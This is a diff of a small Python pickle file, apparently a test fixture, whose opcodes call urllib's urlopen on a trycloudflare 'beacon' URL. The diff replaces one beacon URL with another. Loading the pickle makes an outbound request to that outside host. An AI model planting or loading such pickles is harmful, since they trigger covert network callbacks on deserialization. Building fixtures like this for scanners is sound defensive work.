@@ -1,7 +1,7 @@
 curllib
 urlopen
 p0
-(Vhttps://med-missing-shepherd-ruby.trycloudflare.com/beacon/v11-pickle-fixture-20260929T0220Z
+(Vhttps://disable-perform-properly-training.trycloudflare.com/beacon/v12-pickle-fixture-20260928T2115Z
 p1
 NI5
 tp2
